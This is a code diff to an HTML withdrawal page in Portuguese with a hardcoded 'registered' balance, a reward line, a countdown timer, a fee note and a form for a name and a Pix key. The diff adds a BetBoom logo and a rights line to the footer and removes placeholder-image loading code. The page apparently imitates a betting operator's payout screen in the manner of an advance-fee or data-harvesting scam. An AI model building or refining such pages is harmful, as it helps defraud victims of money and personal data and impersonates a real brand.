@@ -386,26 +386,17 @@
     }
 
     .balance-coin-icon {
-      position: relative;
-      display: inline-grid;
+      display: inline-block;
       flex: 0 0 auto;
       width: 18px;
       height: 18px;
-      place-items: center;
-      border: 2px solid #fff4bb;
       border-radius: 50%;
-      background:
-        radial-gradient(circle at 34% 27%, rgba(255, 255, 255, 0.92) 0 12%, transparent 13%),
-        linear-gradient(145deg, #ffe879 0%, #f7b928 48%, #d98908 100%);
-      box-shadow: 0 2px 5px rgba(201, 141, 10, 0.3);
+      background: url("assets/dollar-coin.png") center / contain no-repeat;
+      box-shadow: 0 2px 5px rgba(201, 141, 10, 0.25);
     }
 
     .balance-coin-icon::after {
-      content: "P";
-      color: #8a5700;
-      font-size: 10px;
-      font-weight: 900;
-      line-height: 1;
+      content: none;
     }
 
     .balance-strip span,
@@ -720,23 +711,22 @@
 
     .coin {
       position: absolute;
-      right: 18px;
-      top: 24px;
-      display: grid;
-      width: 60px;
-      height: 60px;
-      place-items: center;
-      border: 5px solid rgba(255, 255, 255, 0.2);
+      right: 19px;
+      top: 50%;
+      display: block;
+      width: 72px;
+      height: 72px;
       border-radius: 50%;
-      background:
-        radial-gradient(circle at 34% 27%, rgba(255, 255, 255, 0.92) 0 11%, transparent 12%),
-        linear-gradient(145deg, #ffe879 0%, #f7b928 48%, #d98908 100%);
-      color: #8a5700;
-      font-size: 34px;
-      font-weight: 900;
-      box-shadow:
-        inset -7px -8px 0 rgba(126, 76, 0, 0.13),
-        0 10px 20px rgba(0, 0, 0, 0.24);
+      background: url("assets/dollar-coin.png") center / contain no-repeat;
+      font-size: 0;
+      line-height: 0;
+      transform: translateY(-50%);
+      filter: drop-shadow(0 10px 18px rgba(0, 0, 0, 0.28));
+    }
+
+    .balance-card {
+      min-height: 120px;
+      padding-right: 112px;
     }
 
     .balance-subline {
@@ -1550,29 +1540,29 @@
 
     .trust-logos {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
+      gap: 8px;
+      justify-items: center;
       align-items: center;
-      margin: 0 0 14px;
-      padding: 12px 10px;
+      margin: 0 0 16px;
+      padding: 18px 10px 14px;
       border-top: 1px solid var(--line);
       border-bottom: 1px solid var(--line);
       background: var(--surface);
     }
 
-    .trust-logo {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-width: 0;
-      min-height: 48px;
+    .footer-brand-logo {
+      display: block;
+      width: min(178px, 70%);
+      height: auto;
+      object-fit: contain;
     }
 
-    .trust-logo img {
-      display: block;
-      width: 100%;
-      height: 38px;
-      object-fit: contain;
+    .footer-rights {
+      margin: 0;
+      color: #555963;
+      font-size: 11px;
+      font-weight: 900;
+      text-align: center;
     }
 
     .modal-screen {
@@ -1942,6 +1932,10 @@
       padding: 21px;
     }
 
+    .balance-card {
+      padding-right: 116px;
+    }
+
     .balance-subline {
       font-size: 13px;
     }
@@ -2192,7 +2186,7 @@
         <strong class="js-balance-amount">R$ 4.834,72</strong>
         <p class="balance-subline">Valor registrado para solicitação de saque</p>
         <p class="last-reward">Última recompensa: R$ 646,43</p>
-        <div class="coin" aria-hidden="true">P</div>
+        <div class="coin" aria-hidden="true"></div>
       </section>
 
       <section class="data-card" aria-label="Dados do pedido">
@@ -2367,10 +2361,9 @@
         </div>
       </section>
 
-      <footer class="trust-logos" aria-label="Imagens do rodapé">
-        <span class="trust-logo"><img alt=""></span>
-        <span class="trust-logo"><img alt=""></span>
-        <span class="trust-logo"><img alt=""></span>
+      <footer class="trust-logos" aria-label="Rodapé BetBoom">
+        <img class="footer-brand-logo" src="assets/betboom-logo.png" alt="BetBoom">
+        <p class="footer-rights">Betboom 2026 todos direitos reservados</p>
       </footer>
 
       <footer class="fee-footer-note" aria-label="Segurança e ajuda">
@@ -2754,13 +2747,6 @@
         message: "Digite uma chave aleatória válida.",
       };
     }
-
-    /*
-      LINKS_DAS_IMAGENS_DO_RODAPE
-      Imagem 1: https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+1
-      Imagem 2: https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+2
-      Imagem 3: https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+3
-    */
 
     function validateWithdrawForm({ showAllErrors = false } = {}) {
       const nameIsValid = nameInput.value.trim().split(/\s+/).filter(Boolean).length >= 2;
@@ -3211,37 +3197,6 @@
       }, 1600);
     });
 
-    async function loadFooterImages() {
-      const footerImages = document.querySelectorAll(".trust-logo img");
-      if (!footerImages.length) return;
-      const fallbackLinks = [
-        "https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+1",
-        "https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+2",
-        "https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+3",
-      ];
-
-      try {
-        const response = await fetch("LINKS_RODAPE.txt", { cache: "no-store" });
-        if (!response.ok) {
-          throw new Error("Arquivo de links do rodape nao encontrado.");
-        }
-
-        const text = await response.text();
-        const links = text.match(/https?:\/\/\S+/g) || [];
-        if (links.length < footerImages.length) {
-          throw new Error("Arquivo de links do rodape incompleto.");
-        }
-
-        footerImages.forEach((image, index) => {
-          image.src = links[index];
-        });
-      } catch {
-        footerImages.forEach((image, index) => {
-          image.src = fallbackLinks[index];
-        });
-      }
-    }
-
     setDisplayedBalance();
     setSelectedWithdrawAmount();
     updatePixTypeOptions();
@@ -3249,14 +3204,6 @@
     renderWithdrawExpireTimer();
     updatePixKeyField();
     validateWithdrawForm();
-    loadFooterImages();
 </script>
 </body>
 </html>
-
-<!--
-LINKS_DAS_IMAGENS_DO_RODAPE
-Imagem 1: https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+1
-Imagem 2: https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+2
-Imagem 3: https://placehold.co/160x60/e5e7eb/9ca3af?text=Imagem+3
--->
